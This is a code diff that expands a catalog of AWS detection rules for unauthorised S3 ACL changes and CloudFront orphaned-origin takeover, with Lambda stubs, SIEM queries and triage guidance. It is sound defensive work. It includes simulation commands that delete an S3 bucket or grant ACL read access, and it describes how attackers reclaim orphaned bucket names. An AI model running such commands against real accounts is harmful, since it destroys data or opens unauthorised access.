+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"PutBucketAcl", "PutObjectAcl"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-s3-acl-actor-check",
+        "alert": {
+            "rule_id": "det-134",
+            "title": "ACL Persistence Outside Authorized Storage Access Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { bucketName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for S3 ACL management.", "Update allowlist if legitimate."],
-    testingSteps: ["As non-storage role, call PutBucketAcl.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and source IP behind the ACL mutation.", "Verify whether this identity is explicitly approved to manage ACLs for the target bucket or object.", "Determine whether the request came from trusted infrastructure automation or an unexpected workload or user session."],
+    testingSteps: ["As an identity outside the approved ACL-management set, run `PutBucketAcl` or `PutObjectAcl` on a monitored target.", "Verify CloudTrail records the actor and target context.", "Run the detector and confirm it relies on exact authorization and workflow provenance rather than storage-role naming patterns."],
+    lifecycle: {
+      whyItMatters: "Only a narrow set of storage administrators and trusted automation should manage ACLs. An unexpected actor changing ACLs is a strong signal of persistence, exposure, or policy bypass in ACL-enabled paths.",
+      threatContext: {
+        attackerBehavior: "An attacker may use a compromised app role, developer identity, or unusual session to change S3 ACLs and preserve access or enable later exfiltration.",
+        realWorldUsage: "This is attractive because ACL changes can be fast, targeted, and less obvious than bucket-policy rewrites in legacy environments.",
+        whyItMatters: "Actor authorization is the key control question, not whether the role name looks like storage administration.",
+        riskAndImpact: "If missed, defenders may overlook unauthorized storage-control changes that alter real data access paths.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 ACL operations", "Authorized ACL-manager inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.bucketName", "requestParameters.key", "sourceIPAddress"],
+        loggingRequirements: ["ACL mutations must be ingested with full actor context.", "The environment should maintain exact principals or workflows allowed to manage ACLs for sensitive buckets.", "Trusted automation provenance should be modeled explicitly."],
+        limitations: ["Without actor inventories the rule becomes a noisy anomaly detector.", "Some break-glass or migration workflows may legitimately change ACLs under non-obvious identities.", "The actor signal is strongest when combined with ACL-effectiveness and grant-scope context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor changing the ACL" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Bucket whose ACL was modified" },
+          { rawPath: "requestParameters.key", normalizedPath: "file.path", notes: "Object key for object ACL changes" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["file"], type: ["change"], action: "PutBucketAcl", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          s3: { bucket: { name: "target" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized ACL Managers", description: "Exact inventory of identities or workflows allowed to manage ACLs.", examples: ["storage admin role", "terraform pipeline"], falsePositiveReduction: "Replaces brittle name-based allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the mutation came from trusted automation or an unexpected manual session.", examples: ["CloudFormation pipeline", "interactive console session"], falsePositiveReduction: "Separates expected infrastructure changes from suspicious ones." },
+        { dimension: "Target Sensitivity", description: "Classify the target bucket or object by business and data sensitivity.", examples: ["customer data bucket", "public website bucket"], falsePositiveReduction: "Improves prioritization of unauthorized ACL changes." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect S3 ACL changes outside approved storage-management paths. It should match `PutBucketAcl` or `PutObjectAcl`, resolve actor and workflow provenance, and then check whether the identity is explicitly allowed to manage ACLs on the target.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals PutBucketAcl or PutObjectAcl", "actor is not in the approved ACL-manager inventory for the target or request lacks approved automation provenance"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model automation provenance separately from manual sessions. 3. Escalate further when the target is sensitive or the ACL change broadens access.",
+        whenToFire: "Fire when a bucket or object ACL is changed outside approved storage access paths.",
+      },
+      simulationCommand: "aws s3api put-bucket-acl --bucket target --acl private --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and workflow provenance",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because unauthorized ACL changes can alter access immediately.",
+        considerations: ["This is the actor-centric branch of the S3 ACL family.", "Actor authorization and workflow provenance are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-135",
     title: "ACL Change Followed by Access from Granted Principal",
-    description: "High-confidence persistence: PutBucketAcl/PutObjectAcl granting access then subsequent S3 access by the granted principal or external-account-style usage pattern.",
+    description: "High-confidence S3 ACL persistence or exposure detection. This should correlate an ACL grant with later S3 access by the granted principal or resolved recipient account using ordered linkage, not bucket-only co-occurrence.",
     awsService: "S3",
     relatedServices: [],
     severity: "Critical",
@@ -14410,9 +17632,9 @@ detection:
       - GetObject
       - ListBucket
       - PutObject
-  condition: 1 of selection_*
+  condition: selection_acl
 level: critical
-# Full correlation (bucket + granted principal, 1h) requires SIEM. Match ACL grantee to access actor.`,
+# Full correlation requires ordered sequence plus resolved grantee-to-actor linkage.`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl OR eventName=GetObject OR eventName=ListBucket OR eventName=PutObject)
 | eval bucket=requestParameters.bucketName
 | eval actor=coalesce(userIdentity.arn, userIdentity.accountId)
@@ -14446,18 +17668,97 @@ ORDER BY a.acl_time DESC`,
 | filter cnt >= 2
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
+      lambda: `"""
+ACL Change Followed by Access from Granted Principal
+Trigger: EventBridge rule matching PutBucketAcl or PutObjectAcl.
+Use for: Correlation from ACL grant to later S3 access by the grantee.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") not in {"PutBucketAcl", "PutObjectAcl"}:
+        return {"matched": False}
+
+    return {
+        "matched": "requires-acl-grantee-plus-s3-access-correlation",
+        "alert": {
+            "rule_id": "det-135",
+            "title": "ACL Change Followed by Access from Granted Principal",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify ACL change and subsequent access.", "Verify if access was from granted principal.", "Check AccessControlPolicy for grantee."],
-    testingSteps: ["PutBucketAcl granting access, then GetObject from granted principal within 1h.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the ACL grant and resolve the exact grantee principal, account, or group that received access.", "Confirm that later `GetObject`, `ListBucket`, or `PutObject` activity came from that granted principal or recipient account rather than an unrelated actor touching the same bucket.", "Assess whether the sequence represents expected sharing or suspicious persistence and external use."],
+    testingSteps: ["Apply an ACL grant to a lab bucket or object, then access it from the granted principal or recipient account within one hour.", "Verify both the grant and the later access events appear in CloudTrail with enough identity context to link the grantee to the access actor.", "Run the correlation detector and confirm it requires ordered grant-to-access linkage rather than simple bucket co-occurrence."],
+    lifecycle: {
+      whyItMatters: "This is the strongest ACL-persistence signal in the family: access granted through ACLs is actually used afterward by the recipient. That turns a risky configuration change into demonstrated exploitation or persistence.",
+      threatContext: {
+        attackerBehavior: "An attacker may add an ACL grant for a recipient they control and then use that access path to read, list, or write to the bucket or object.",
+        realWorldUsage: "This is attractive because the ACL change can quietly establish a secondary access path that becomes visible only when the grantee starts using it.",
+        whyItMatters: "The highest-fidelity signal is the ordered chain from ACL grant to recipient access, not the grant or access in isolation.",
+        riskAndImpact: "If missed, defenders may not recognize that a persistence or sharing path created by ACLs was actually exercised.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 ACL operations", "AWS CloudTrail data or management events for S3 object and bucket access"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.accountId", "requestParameters.bucketName", "requestParameters.key", "requestParameters.AccessControlPolicy"],
+        loggingRequirements: ["ACL mutation events and later S3 access events must be ingested into the same analytics environment.", "The platform should resolve grantees from ACL policy structures and canned ACL semantics.", "The engine must support ordered time-window correlation with grantee-to-actor linkage."],
+        limitations: ["Recipient linkage can be difficult when ACL grants are group-based or represented indirectly.", "Bucket-only joins are too noisy and should not be used as the final decision point.", "Legitimate cross-account sharing workflows can resemble the same sequence."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Bucket receiving ACL grant and later access" },
+          { rawPath: "requestParameters.key", normalizedPath: "file.path", notes: "Object receiving ACL grant where applicable" },
+          { rawPath: "enrichment.granteePrincipal", normalizedPath: "s3.acl.grantee.principal", notes: "Resolved recipient of the ACL grant" },
+          { rawPath: "follow_on.userIdentity.arn", normalizedPath: "related.user.arn", notes: "Actor later accessing the granted resource" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["file"], type: ["change"], action: "PutBucketAcl", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          s3: { bucket: { name: "target" }, acl: { grantee: { principal: "123456789999" } } },
+          related: { user: { arn: "arn:aws:iam::123456789999:user/external-reader" }, event: { action: "GetObject" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Resolved ACL Grantee", description: "Resolve the exact principal, account, or group that received access from the ACL change.", examples: ["external AWS account", "AllUsers group"], falsePositiveReduction: "Makes the later access linkage precise." },
+        { dimension: "Access Actor Linkage", description: "Determine whether the later access came from the granted recipient or a principal within the granted account.", examples: ["same account as grantee", "different unrelated actor"], falsePositiveReduction: "Prevents bucket-only false positives." },
+        { dimension: "Sharing Workflow Context", description: "Determine whether the grant-and-access sequence matches a known sharing or distribution process.", examples: ["approved partner delivery", "untracked external read"], falsePositiveReduction: "Separates legitimate sharing from suspicious persistence." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model an ACL grant-to-access chain: a bucket or object ACL is changed to grant access, and then the granted recipient uses that access soon afterward. It should require event order and resolved linkage between the ACL grantee and the later access actor.",
+        conditions: ["first eventSource equals s3.amazonaws.com and eventName equals PutBucketAcl or PutObjectAcl", "ACL grant resolves to a principal, account, or broad group recipient", "second event is GetObject, ListBucket, or PutObject by the granted recipient or linked recipient account", "follow-on activity occurs within 1 hour"],
+        tuningGuidance: "1. Require order. 2. Resolve grantees explicitly instead of joining on bucket alone. 3. Escalate strongly for external-account or public-style grants that are later exercised.",
+        whenToFire: "Fire when an ACL grant is followed by S3 access from the granted principal or recipient account.",
+      },
+      simulationCommand: "aws s3api put-bucket-acl --bucket target --grant-read id=EXAMPLECANONICALID",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with resolved grantee linkage and sharing context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM correlation engines", "Athena with grantee joins", "Panther / Chronicle / Datadog", "EventBridge + Lambda with temporary state"],
+        scheduling: "Near-real-time is preferred because exercised ACL persistence is immediately actionable.",
+        considerations: ["This is the highest-fidelity S3 ACL detector in the family.", "Resolved grantee linkage is the main implementation dependency."],
+      },
+    },
   },
 
   // --- CloudFront Orphaned Origin Takeover ---
   {
     id: "det-136",
     title: "S3 Bucket Deleted That Matches CloudFront Origin",
-    description: "Detect the local control-plane event that creates orphan risk. Deleting a bucket that is still used by CloudFront is the main local precursor to orphaned-origin takeover.",
+    description: "Detects deletion of an S3 bucket that is still referenced by a CloudFront distribution origin. This is the local precursor event that creates orphaned-origin takeover risk.",
     awsService: "S3",
     relatedServices: ["CloudFront"],
     severity: "High",
@@ -14490,16 +17791,94 @@ ORDER BY eventTime DESC
 | filter eventName = "DeleteBucket"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["DeleteBucket"] } }, null, 2),
+      lambda: `"""
+S3 Bucket Deleted That Matches CloudFront Origin
+Trigger: EventBridge rule matching DeleteBucket.
+Use for: Real-time detection of CloudFront origin orphaning precursors.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "s3.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DeleteBucket":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-cloudfront-origin-reference-check",
+        "alert": {
+            "rule_id": "det-136",
+            "title": "S3 Bucket Deleted That Matches CloudFront Origin",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "bucket_name": detail.get("requestParameters", {}).get("bucketName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "DeleteBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { bucketName: "my-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the deleted bucket name.", "Check CloudFront distributions for matching S3 origin.", "Remediate orphaned origins if found."],
-    testingSteps: ["Delete bucket that is CloudFront origin.", "Verify detection triggers.", "Run CloudFront origin inventory."],
+    investigationSteps: ["Identify the deleted bucket and verify whether any CloudFront distribution origin still references its S3 domain name.", "Determine whether the bucket was intentionally decommissioned only after origin updates or whether the deletion created an orphaned origin path.", "If an orphan exists, reserve or recreate the bucket name safely or update the distribution immediately."],
+    testingSteps: ["Delete a lab bucket that is still configured as a CloudFront origin.", "Verify CloudTrail records the `DeleteBucket` event and your enrichment matches the bucket name to a CloudFront origin.", "Run the detector and confirm it only escalates when the deleted bucket is still referenced by CloudFront."],
+    lifecycle: {
+      whyItMatters: "Deleting a bucket that CloudFront still references creates the local condition for origin takeover. If the name becomes available, another account may be able to claim it and serve content behind the trusted distribution.",
+      threatContext: {
+        attackerBehavior: "An attacker may wait for or intentionally cause a referenced origin bucket to disappear so the name can later be reclaimed and used for hostile content delivery.",
+        realWorldUsage: "This class of issue appears when infrastructure teardown, renaming, or migration leaves distribution origins pointing at non-existent S3 buckets.",
+        whyItMatters: "The deletion is not the exploit itself, but it is the moment defenders can still intervene before name reuse turns the misconfiguration into a takeover path.",
+        riskAndImpact: "If missed, a customer-facing or trusted CloudFront distribution may continue pointing at a bucket name that can later be claimed by another party.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail for S3 bucket deletion", "CloudFront distribution origin inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.bucketName", "sourceIPAddress"],
+        loggingRequirements: ["DeleteBucket events must be ingested promptly.", "The platform should maintain current CloudFront origin inventories or perform on-demand distribution lookups.", "Origin normalization must correctly map S3 bucket names to CloudFront origin domain names."],
+        limitations: ["Bucket deletion alone is not sufficient without CloudFront origin context.", "Custom origins and some origin naming patterns require careful parsing.", "A fast remediation may eliminate risk before exploitation occurs."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "requestParameters.bucketName", normalizedPath: "s3.bucket.name", notes: "Deleted bucket name" },
+          { rawPath: "enrichment.cloudfrontOriginMatches", normalizedPath: "aws.cloudfront.origin.matches", notes: "Whether a distribution still references the bucket" },
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor deleting the bucket" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["storage"], type: ["deletion"], action: "DeleteBucket", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          s3: { bucket: { name: "my-bucket" } },
+          aws: { cloudfront: { origin: { matches: true } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "CloudFront Origin Linkage", description: "Determine whether the deleted bucket is still referenced by any CloudFront distribution origin.", examples: ["single prod distribution", "no remaining origin references"], falsePositiveReduction: "Separates generic bucket deletion from orphan-risk creation." },
+        { dimension: "Distribution Sensitivity", description: "Classify the affected distribution by business criticality and public exposure.", examples: ["customer-facing site", "internal test distribution"], falsePositiveReduction: "Improves prioritization of orphan-risk events." },
+        { dimension: "Decommission Workflow Context", description: "Determine whether origin references were expected to be removed as part of a planned migration.", examples: ["approved migration", "untracked deletion"], falsePositiveReduction: "Separates expected teardown from risky orphan creation." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect `DeleteBucket` when the deleted bucket name still maps to an active CloudFront S3 origin. It is the precursor-stage detector for CloudFront orphaned-origin takeover risk.",
+        conditions: ["eventSource equals s3.amazonaws.com", "eventName equals DeleteBucket", "deleted bucket name matches at least one currently configured CloudFront S3 origin"],
+        tuningGuidance: "1. Normalize S3 origin hostnames accurately. 2. Refresh CloudFront origin inventories regularly. 3. Escalate strongly when the affected distribution is public or high-value.",
+        whenToFire: "Fire when a deleted S3 bucket is still referenced by a CloudFront distribution origin.",
+      },
+      simulationCommand: "aws s3api delete-bucket --bucket my-bucket",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with CloudFront origin linkage and decommission context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with CloudFront origin inventory joins", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because defenders can still remediate before name reuse occurs.",
+        considerations: ["This is the precursor-event detector for the orphaned-origin family.", "CloudFront origin linkage is the main dependency."],
+      },
+    },
   },
   {
     id: "det-137",
     title: "Orphaned CloudFront S3 Origin Detection",
-    description: "Posture/scheduled analytics: detect distributions whose configured S3 origin no longer exists. Compare CloudFront distribution origin bucket names against currently existing S3 buckets. This is the actual exploitable state.",
+    description: "Posture detection for CloudFront distributions whose configured S3 origin bucket no longer exists. This is the actual exploitable orphaned-origin state, not just the precursor deletion event.",
     awsService: "CloudFront",
     relatedServices: ["S3"],
     severity: "Critical",
@@ -14536,16 +17915,87 @@ ORDER BY eventTime DESC`,
 | filter eventName in ["GetDistribution", "ListDistributions"]
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.cloudfront"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["cloudfront.amazonaws.com"], eventName: ["GetDistribution"] } }, null, 2),
+      lambda: `"""
+Orphaned CloudFront S3 Origin Detection
+Trigger: Scheduled inventory or EventBridge-assisted posture check.
+Use for: Identifying CloudFront distributions with missing S3 origins.
+"""
+
+def lambda_handler(event, context):
+    return {
+        "matched": "requires-cloudfront-origin-inventory-plus-headbucket-validation",
+        "alert": {
+            "rule_id": "det-137",
+            "title": "Orphaned CloudFront S3 Origin Detection",
+            "severity": "Critical",
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "cloudfront.amazonaws.com", importantFields: ["eventSource", "eventName", "requestParameters.id", "responseElements.distributionConfig.origins", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "cloudfront.amazonaws.com", eventName: "GetDistribution", requestParameters: { id: "E1234" }, responseElements: { distributionConfig: { origins: { items: [{ domainName: "deleted-bucket.s3.amazonaws.com" }] } } }, eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Run CloudFront distribution inventory.", "For each S3 origin, verify bucket exists.", "Remediate or reserve bucket names for orphaned origins."],
-    testingSteps: ["Delete bucket used as CloudFront origin.", "Run posture check to identify orphaned distribution."],
+    investigationSteps: ["Inventory all CloudFront distributions and extract S3 origin domain names.", "Verify whether the referenced bucket exists and is controlled by the expected account.", "For any orphaned origin, update the distribution or safely reserve the bucket name to prevent reuse."],
+    testingSteps: ["Delete or temporarily de-reference a lab S3 bucket that remains configured as a CloudFront origin.", "Run the scheduled posture check that compares CloudFront origins against existing S3 buckets.", "Verify the orphaned distribution is identified as exploitable posture state rather than a generic CloudFront read."],
+    lifecycle: {
+      whyItMatters: "This rule captures the actual takeover condition: a distribution still points to an S3 origin bucket that does not exist. Once this state exists, name reuse can turn it into content takeover.",
+      threatContext: {
+        attackerBehavior: "An attacker may monitor for orphaned origin names and claim them when the bucket name becomes available.",
+        realWorldUsage: "This class of exposure usually results from stale infrastructure references rather than an attacker API action, which is why posture analytics are essential.",
+        whyItMatters: "Unlike precursor detections, this rule identifies the directly exploitable misconfiguration state itself.",
+        riskAndImpact: "If missed, trusted CloudFront distributions may serve content from a bucket later controlled by a different party.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["CloudFront distribution inventory APIs", "S3 bucket existence validation or bucket inventory", "Optional CloudTrail for origin configuration changes"],
+        requiredFields: ["distribution id", "origin domainName", "alias set", "bucket existence status", "origin type"],
+        loggingRequirements: ["The posture job must enumerate CloudFront distributions regularly.", "The platform must correctly identify which origins correspond to S3 buckets.", "Bucket-existence checks such as `HeadBucket` must run in a controlled and reliable way."],
+        limitations: ["This is a posture control, not a pure event-driven rule.", "Not every origin-looking hostname is an S3 bucket that can be reclaimed the same way.", "Cross-account ownership checks may require additional validation beyond simple existence testing."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "distribution.id", normalizedPath: "aws.cloudfront.distribution.id", notes: "Affected CloudFront distribution" },
+          { rawPath: "origin.domainName", normalizedPath: "aws.cloudfront.origin.domain_name", notes: "Configured S3 origin domain name" },
+          { rawPath: "enrichment.bucketExists", normalizedPath: "s3.bucket.exists", notes: "Whether the origin bucket currently exists" },
+          { rawPath: "distribution.aliases", normalizedPath: "url.domain", notes: "Customer-facing aliases for prioritization" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["configuration"], type: ["info"], action: "orphaned_cloudfront_origin_check", outcome: "success", provider: "aws" },
+          aws: {
+            cloudfront: { distribution: { id: "E1234" }, origin: { domain_name: "deleted-bucket.s3.amazonaws.com" } },
+          },
+          s3: { bucket: { exists: false } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Bucket Existence and Control", description: "Determine whether the origin bucket exists and whether it is controlled by the expected owner.", examples: ["missing bucket", "existing but wrong owner"], falsePositiveReduction: "Distinguishes exploitable state from normal operation." },
+        { dimension: "Distribution Exposure", description: "Classify whether the affected distribution is public, customer-facing, or internal.", examples: ["www.example.com", "internal asset CDN"], falsePositiveReduction: "Prioritizes the most dangerous orphaned origins." },
+        { dimension: "Origin Type Validation", description: "Confirm that the origin truly maps to an S3 bucket path susceptible to this failure mode.", examples: ["bucket.s3.amazonaws.com", "non-S3 custom origin"], falsePositiveReduction: "Prevents false positives on unrelated origins." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should run as scheduled posture analytics: enumerate CloudFront distributions, extract S3-backed origin bucket names, and flag any distribution whose referenced bucket no longer exists or is no longer controlled as expected.",
+        conditions: ["distribution inventory contains an S3-backed origin", "referenced bucket name does not currently exist or fails expected ownership validation"],
+        tuningGuidance: "1. Normalize S3 origin hostnames carefully. 2. Re-run the posture job on a regular cadence. 3. Prioritize distributions with public aliases or business-critical traffic.",
+        whenToFire: "Fire when a CloudFront distribution references an S3 origin bucket that is missing or otherwise orphaned.",
+      },
+      simulationCommand: "aws cloudfront list-distributions",
+      quality: {
+        signalQuality: 10,
+        falsePositiveRate: "Low with accurate origin parsing and bucket validation",
+        expectedVolume: "Extremely low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["Scheduled posture jobs", "Athena with inventory snapshots", "Lambda or Step Functions inventory checks", "Security data lake workflows"],
+        scheduling: "Run on a regular schedule and after distribution or bucket lifecycle changes.",
+        considerations: ["This is the core posture detector for the orphaned-origin family.", "Reliable origin parsing and bucket validation are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-138",
     title: "Orphaned Origin on Sensitive or Public Distribution",
-    description: "Prioritize orphaned origins on internet-facing or high-value distributions. Distribution is sensitive, high-traffic, customer-facing, or uses important alternate domain names.",
+    description: "Prioritizes orphaned CloudFront S3 origins that affect public, customer-facing, or otherwise high-value distributions. This is the severity-focused variant of the posture detector.",
     awsService: "CloudFront",
     relatedServices: ["S3"],
     severity: "Critical",
@@ -14571,16 +18021,87 @@ level: critical
 | filter eventName = "GetDistribution"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.cloudfront"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["cloudfront.amazonaws.com"], eventName: ["GetDistribution"] } }, null, 2),
+      lambda: `"""
+Orphaned Origin on Sensitive or Public Distribution
+Trigger: Scheduled posture or inventory prioritization workflow.
+Use for: Elevating orphaned-origin findings on critical distributions.
+"""
+
+def lambda_handler(event, context):
+    return {
+        "matched": "requires-orphaned-origin-plus-distribution-criticality-check",
+        "alert": {
+            "rule_id": "det-138",
+            "title": "Orphaned Origin on Sensitive or Public Distribution",
+            "severity": "Critical",
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "cloudfront.amazonaws.com", importantFields: ["eventSource", "eventName", "requestParameters.id", "responseElements.distributionConfig.aliases", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "cloudfront.amazonaws.com", eventName: "GetDistribution", requestParameters: { id: "E1234" }, responseElements: { distributionConfig: { aliases: { items: ["www.example.com"] } } }, eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify orphaned distributions with customer-facing aliases.", "Prioritize remediation.", "Reserve bucket name or update origin."],
-    testingSteps: ["Run posture check filtered for prod/www aliases."],
+    investigationSteps: ["Identify which orphaned distributions have customer-facing aliases, production traffic, or sensitive business use.", "Prioritize immediate remediation for those distributions ahead of lower-value orphaned origins.", "Reserve the bucket name safely or update the distribution origin before public exploitation is possible."],
+    testingSteps: ["Run the orphaned-origin posture job and then filter the results to distributions with production or customer-facing aliases.", "Verify the detector elevates those sensitive distributions above lower-value orphaned origins.", "Confirm the prioritization uses distribution criticality rather than only alias text fragments."],
+    lifecycle: {
+      whyItMatters: "Not all orphaned origins carry the same risk. An orphaned origin behind a public or customer-facing CloudFront distribution is materially more dangerous than one on an internal or low-value path.",
+      threatContext: {
+        attackerBehavior: "An attacker who can claim an orphaned bucket name will prefer distributions that already serve customer traffic or trusted public domains.",
+        realWorldUsage: "Customer-facing aliases, primary websites, and high-traffic distribution paths are the most valuable takeover targets.",
+        whyItMatters: "Distribution criticality determines remediation urgency and business impact.",
+        riskAndImpact: "If missed, defenders may treat a takeover path on a production public domain as operationally equivalent to a low-risk internal CDN edge case.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["CloudFront distribution inventory", "Orphaned-origin posture results", "Distribution criticality or exposure metadata"],
+        requiredFields: ["distribution id", "distribution aliases", "origin domainName", "bucket existence status", "business criticality tags"],
